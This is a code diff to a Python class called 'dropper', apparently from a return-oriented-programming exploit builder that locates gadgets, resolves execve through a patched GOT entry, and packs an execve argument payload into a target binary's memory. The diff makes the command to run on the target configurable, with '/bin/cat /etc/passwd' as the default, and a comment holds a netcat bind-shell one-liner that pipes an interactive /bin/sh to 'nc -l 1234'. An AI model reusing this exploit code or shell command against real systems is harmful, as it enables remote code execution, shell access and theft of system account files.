@@ -24,14 +24,29 @@ class dropper():
         if self.readable_area == -1:
             self.readable_area = self.get_readable_area()
 
-        self.cmd = cmd
-        self.analyzed = False
+        self.set_cmd("/bin/cat", ["/bin/cat", "/etc/passwd"])
+
+    def set_can_control_fd(self, value):
+        """Set the filedescriptor controlled by the user, if no fd can be controlled should be set at -1.
+        """
+        self.can_control_fd = value
 
     def get_writeable_area(self):
         return self.gts.elf.get_section_by_name('.data').header.sh_addr
 
+
     def get_readable_area(self):
         return 0x808080
+
+    def set_cmd(self, cmd, argv):
+        """Set the cmd and the argument vector to execute on the target machine if our payload made the exploit successful
+        Args:
+        cmd = the full path of the executable on the target machine to invoke
+        argv = the command line arguments to pass to the executable (with the name of the executable itself)
+
+        """
+        self.cmd = cmd + '\00'
+        self.argv = [a + '\00' for a in argv]
 
     def analyze_all(self):
         print "Finding gadgets.."
@@ -80,13 +95,15 @@ class dropper():
 
         return imports, imports_plt
 
-    def set_function_for_got_patching(self, name='', offset=0, base=0, size=0):
+    def set_function_for_address_resolving(self, name='', offset=0, base=0, size=0):
+        """Set the function from which calculate the offset of execve or system, this function should be already be used before the patching.
+        """
         self._got_f = name
         self._got_offset = offset
         self._got_base = base
         self._got_size = size
 
-        #stub
+        #stubxo
         self._got_f = 'strrchr'
         self._got_offset = 0x34180
         self._got_base = 0x837a0
@@ -126,8 +143,6 @@ class dropper():
     def payload_execve_args(self):
         # cmd = "/bin/sh\x00"
         # argv = [cmd, "-c\x00", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i | nc -l 1234 > /tmp/f\x00"]
-        cmd = "/bin/cat\x00"
-        argv = [cmd, "/etc/passwd\x00"]
 
         addr_size = self.gts.arch_info.address_size/8
         fmt = "<I"
@@ -136,26 +151,26 @@ class dropper():
 
         ptr = self.writeable_area
         first_arg  = ptr
-        read_input = cmd
-        ptr += len(cmd)
+        read_input = self.cmd
+        ptr += len(self.cmd)
         third_arg = ptr
         read_input += struct.pack(fmt, 0x0)
         ptr += addr_size
 
         second_arg = ptr
-        ptr += (len(argv) + 1) * addr_size
+        ptr += (len(self.argv) + 1) * addr_size
 
-        for i, arg in enumerate(argv):
+        for i, arg in enumerate(self.argv):
             offset = 0
             if i != 0:
-                offset = len(argv[i - 1])
+                offset = len(self.argv[i - 1])
 
             read_input += struct.pack(fmt, ptr + offset)
             ptr += offset
 
         read_input += struct.pack(fmt, 0x0)
 
-        for arg in argv:
+        for arg in self.argv:
             read_input += arg
 
         return [first_arg, second_arg, third_arg], read_input
